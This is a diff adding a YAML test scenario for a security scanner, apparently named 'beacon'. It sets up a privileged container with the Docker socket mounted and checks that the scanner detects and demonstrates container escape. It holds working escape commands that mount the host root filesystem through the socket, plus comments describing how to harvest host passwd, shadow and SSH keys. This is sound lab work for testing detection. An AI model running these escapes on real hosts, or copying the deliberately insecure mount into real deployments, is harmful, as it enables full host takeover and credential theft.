@@ -1,0 +1,110 @@
+name: container-escape
+description: >
+  Privileged container with Docker socket mounted — the classic container
+  escape scenario. Beacon should detect the dangerous mount and privileged
+  mode, then in authorized mode demonstrate escape: list host containers,
+  read host filesystem, and prove full host access. Tests beacon's ability
+  to detect and exploit container breakout paths.
+tags: [pivot, container, escape, docker, privileged, authorized, exploit]
+
+services:
+  # "Application" container that is over-privileged (common misconfiguration)
+  webapp:
+    image: alpine:3.19
+    ports: ["9353:8080"]
+    # Intentionally dangerous: Docker socket mounted + privileged
+    volumes:
+      - /var/run/docker.sock:/var/run/docker.sock
+    privileged: true
+    # Run a simple HTTP server so beacon has something to scan
+    command: >
+      sh -c "apk add --no-cache curl docker-cli socat >/dev/null 2>&1;
+      while true; do
+        echo -e 'HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n<html><body><h1>App Running</h1></body></html>' |
+        socat - TCP-LISTEN:8080,reuseaddr,fork;
+      done"
+
+ready:
+  cmd: "curl -sf http://localhost:9353/ >/dev/null 2>&1"
+  timeout: 90s
+  interval: 3s
+
+assertions:
+  # ── Pre-flight: verify container escape paths exist ────────────────────
+
+  - name: exploit-docker-socket-mounted
+    type: command
+    expect:
+      command: >
+        docker compose exec -T webapp ls -la /var/run/docker.sock 2>/dev/null | grep -q 'docker.sock'
+      exit_code: 0
+
+  - name: exploit-can-list-host-containers
+    type: command
+    expect:
+      command: >
+        docker compose exec -T webapp docker ps 2>/dev/null | grep -qE 'CONTAINER|Up'
+      exit_code: 0
+
+  - name: exploit-can-read-host-filesystem
+    type: command
+    expect:
+      command: >
+        docker compose exec -T webapp docker run --rm -v /:/hostfs alpine cat /hostfs/etc/hostname 2>/dev/null | grep -qE '.'
+      exit_code: 0
+      timeout: 30s
+
+  - name: exploit-privileged-mode-active
+    type: command
+    expect:
+      command: >
+        docker compose exec -T webapp cat /proc/self/status | grep -q 'CapEff.*000001ffffffffff'
+      exit_code: 0
+
+  # ── Beacon detection: container escape risks ───────────────────────────
+  # Beacon should detect these even in surface/deep mode by probing
+  # the container environment for escape indicators.
+
+  - name: detects-docker-socket-exposed
+    type: beacon
+    target: localhost:9353
+    args: ["--no-enrich", "--scanners", "portscan", "--ports", "9353", "--deep", "--permission-confirmed"]
+    expect:
+      check_id: container.docker_socket_exposed
+
+  # ── Beacon exploitation: container escape proof ────────────────────────
+  # In authorized mode, beacon should demonstrate the full escape chain:
+  # 1. Detect Docker socket is mounted
+  # 2. Use socket to enumerate host containers
+  # 3. Mount host filesystem via Docker API
+  # 4. Read sensitive host files (passwd, shadow, SSH keys)
+  # 5. Demonstrate ability to run arbitrary containers on host
+
+  - name: beacon-enumerates-host-containers
+    type: beacon
+    target: localhost:9353
+    args: ["--no-enrich", "--scanners", "portscan", "--ports", "9353", "--deep", "--permission-confirmed", "--authorized"]
+    expect:
+      check_id: exploit.container_escape
+      evidence_key: escape_method
+      evidence_value: docker_socket
+
+  - name: beacon-reads-host-filesystem
+    type: beacon
+    target: localhost:9353
+    args: ["--no-enrich", "--scanners", "portscan", "--ports", "9353", "--deep", "--permission-confirmed", "--authorized"]
+    expect:
+      check_id: exploit.host_access
+      evidence_key: access_level
+      evidence_value: root
+
+  - name: beacon-extracts-host-credentials
+    type: beacon
+    target: localhost:9353
+    args: ["--no-enrich", "--scanners", "portscan", "--ports", "9353", "--deep", "--permission-confirmed", "--authorized"]
+    expect:
+      check_id: exploit.credential_harvest
+      evidence_key: credential_source
+      evidence_value: host_filesystem
+
+timeout: 8m
